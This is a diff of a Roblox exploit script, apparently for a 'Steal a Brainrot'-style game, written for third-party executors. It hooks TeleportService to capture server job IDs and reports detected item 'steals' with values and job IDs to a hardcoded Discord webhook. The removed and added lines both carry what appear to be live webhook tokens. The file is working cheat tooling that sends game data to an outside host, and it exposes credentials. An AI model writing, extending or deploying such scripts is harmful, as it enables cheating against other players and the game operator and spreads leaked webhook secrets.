@@ -1,35 +1,21 @@
 local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
-local STEAL_WEBHOOK = "https://discord.com/api/webhooks/1497992244014092479/CZTk6O2f18v4iKFsCB11YxJOSHLS1frXTWGDtlet-pZlw4dm8vAQRbNkWuVS0iIntBUV"
+local STEAL_WEBHOOK = "https://discord.com/api/webhooks/1498002749411950692/MkL7wdl3_DeRIwxqcpY44HxB9BJmzdeleo80YBcVsZNEQ3XUKGopVTIIubMoDNEKeYnO"
 
-local stealDetectorRequest = syn and syn.request or fluxus and fluxus.request or krnl and krnl.request or http and http.request or request or http_request or (HttpService and HttpService.PostAsync and function(url, body)
-    return HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
-end)
+local stealDetectorRequest = syn and syn.request or fluxus and fluxus.request or krnl and krnl.request or http and http.request or request or http_request
 
 local function sendWebhookBody(body)
-    if stealDetectorRequest then
-        pcall(function()
-            if typeof(stealDetectorRequest) == "function" then
-                stealDetectorRequest({
-                    Url = STEAL_WEBHOOK,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = body
-                })
-            else
-                game:HttpPost(STEAL_WEBHOOK, body, true, "application/json")
-            end
-        end)
-    else
-        pcall(function()
+    pcall(function()
+        if stealDetectorRequest then
+            stealDetectorRequest({Url = STEAL_WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+        else
             HttpService:PostAsync(STEAL_WEBHOOK, body, Enum.HttpContentType.ApplicationJson)
-        end)
-    end
+        end
+    end)
 end
 
 local function formatMoney(amount)
@@ -47,9 +33,8 @@ local function parseMoneyPerSecond(text)
     if not num then return nil end
     num = tonumber(num)
     if not num then return nil end
-    suffix = string.upper(suffix or "")
     local multipliers = { K = 1e3, M = 1e6, B = 1e9, T = 1e12 }
-    return num * (multipliers[suffix] or 1)
+    return num * (multipliers[string.upper(suffix or "")] or 1)
 end
 
 local serverSteals = {}
@@ -65,13 +50,7 @@ local function flushSteals(jobId)
         table.insert(fields, {name = steal.name, value = steal.money, inline = true})
     end
     table.insert(fields, {name = "job id", value = jobId, inline = false})
-    local body = HttpService:JSONEncode({
-        embeds = {{
-            title = #steals == 1 and "Steal Detected" or (#steals .. " Steals Detected"),
-            fields = fields
-        }}
-    })
-    sendWebhookBody(body)
+    sendWebhookBody(HttpService:JSONEncode({embeds = {{title = #steals == 1 and "Steal Detected" or (#steals .. " Steals Detected"), color = 15548997, fields = fields}}}))
 end
 
 local function recordSteal(name, money, jobId)
@@ -161,6 +140,10 @@ local function getBrainrotFromFrame(frame)
             end
         end
     end
+    local frameNameLower = string.lower(frame.Name)
+    for brainrot in pairs(brainrotSet) do
+        if frameNameLower:find(brainrot, 1, true) then return brainrot end
+    end
     return nil
 end
 
@@ -176,6 +159,7 @@ end
 
 local pendingStealName = nil
 local pendingStealMoney = nil
+local hookAvailable = typeof(hookfunction) == "function"
 
 local function watchTemplateButtons(template)
     local function onClicked()
@@ -184,7 +168,12 @@ local function watchTemplateButtons(template)
         if brainrot then
             pendingStealName = brainrot
             pendingStealMoney = money
-            print("[Click] set pending: " .. brainrot)
+            print("[Click] pending: " .. brainrot)
+            if not hookAvailable then
+                recordSteal(brainrot, money, tostring(game.JobId))
+                pendingStealName = nil
+                pendingStealMoney = nil
+            end
         end
     end
     for _, desc in ipairs(template:GetDescendants()) do
@@ -199,81 +188,43 @@ local function watchTemplateButtons(template)
     end)
 end
 
+local alreadyReported = {}
+
 local function watchBrainrotsContainer(container)
+    local function handleTemplate(child)
+        task.spawn(watchTemplateButtons, child)
+        if not hookAvailable then
+            local brainrot = getBrainrotFromFrame(child)
+            if brainrot and not alreadyReported[child] then
+                alreadyReported[child] = true
+                local money = getMoneyFromFrame(child)
+                recordSteal(brainrot, money, tostring(game.JobId))
+            end
+            child.DescendantAdded:Connect(function()
+                if not alreadyReported[child] then
+                    local b = getBrainrotFromFrame(child)
+                    if b then
+                        alreadyReported[child] = true
+                        local m = getMoneyFromFrame(child)
+                        recordSteal(b, m, tostring(game.JobId))
+                    end
+                end
+            end)
+        end
+    end
     for _, child in ipairs(container:GetChildren()) do
-        task.spawn(watchTemplateButtons, child)
+        handleTemplate(child)
     end
-    container.ChildAdded:Connect(function(child)
-        task.spawn(watchTemplateButtons, child)
-    end)
+    container.ChildAdded:Connect(handleTemplate)
 end
 
-local function isDevConsole(gui)
-    local current = gui
-    while current do
-        if current.Name == "DevConsoleMaster" or current.Name == "DevConsoleUI" then return true end
-        current = current.Parent
-    end
-    return false
-end
-
-local seenAtStartup = {}
-
-local function getGuiText(gui)
-    if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then return gui.Text
-    elseif gui:IsA("ImageLabel") or gui:IsA("ImageButton") then return gui.Image end
-    return ""
-end
-
-local function checkForBrainrot(gui, isInitialScan)
-    if isDevConsole(gui) then return end
-    if not gui:IsA("GuiBase2d") and not gui:IsA("ScreenGui") then return end
-    local guiName = string.lower(gui.Name)
-    local guiText = string.lower(getGuiText(gui))
-    local matched = nil
-    for brainrot in pairs(brainrotSet) do
-        if guiName:find(brainrot, 1, true) or guiText:find(brainrot, 1, true) then
-            matched = brainrot
-            break
-        end
-    end
-    if not matched then return end
-    local path = gui:GetFullName()
-    if isInitialScan then
-        seenAtStartup[path] = true
-    end
-end
-
-local function monitorText(gui)
-    if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
-        gui:GetPropertyChangedSignal("Text"):Connect(function()
-            checkForBrainrot(gui, false)
-        end)
-    end
-end
-
-local function applyMonitoring(container, isInitialScan)
-    if isDevConsole(container) then return end
-    for _, descendant in ipairs(container:GetDescendants()) do
-        if not isDevConsole(descendant) then
-            checkForBrainrot(descendant, isInitialScan)
-            monitorText(descendant)
-        end
-    end
-    container.DescendantAdded:Connect(function(descendant)
-        if isDevConsole(descendant) then return end
-        checkForBrainrot(descendant, false)
-        monitorText(descendant)
-    end)
-end
-
-if hookfunction then
+if hookAvailable then
     pcall(function()
         hookfunction(TeleportService.TeleportToPlaceInstance, function(self, placeId, jobId, ...)
             local realJobId = tostring(jobId)
-            print("[TeleportHook] real job id = " .. realJobId)
+            print("[TeleportHook] job id = " .. realJobId)
             if pendingStealName then
-                print("[TeleportHook] sending for: " .. pendingStealName)
+                print("[TeleportHook] sending: " .. pendingStealName)
                 recordSteal(pendingStealName, pendingStealMoney, realJobId)
                 pendingStealName = nil
                 pendingStealMoney = nil
@@ -281,20 +232,19 @@ if hookfunction then
         end)
         print("[TeleportHook] hooked")
     end)
+else
+    print("[TeleportHook] hookfunction unavailable — using fallback mode")
 end
 
 task.spawn(function()
     local ok1, gui = pcall(function() return PlayerGui:WaitForChild("CraftingMachine", 30) end)
-    if not ok1 or not gui then return end
+    if not ok1 or not gui then print("[Watcher] CraftingMachine not found") return end
     local ok2, inner = pcall(function() return gui:WaitForChild("CraftingMachine", 10) end)
-    if not ok2 or not inner then return end
+    if not ok2 or not inner then print("[Watcher] inner CraftingMachine not found") return end
     local ok3, content = pcall(function() return inner:WaitForChild("Content", 10) end)
-    if not ok3 or not content then return end
+    if not ok3 or not content then print("[Watcher] Content not found") return end
     local ok4, brainrots = pcall(function() return content:WaitForChild("Brainrots", 10) end)
-    if not ok4 or not brainrots then return end
+    if not ok4 or not brainrots then print("[Watcher] Brainrots not found") return end
+    print("[Watcher] watching — hook mode: " .. tostring(hookAvailable))
     watchBrainrotsContainer(brainrots)
-    print("[Watcher] watching brainrots container")
 end)
-
-applyMonitoring(CoreGui, true)
-applyMonitoring(PlayerGui, true)
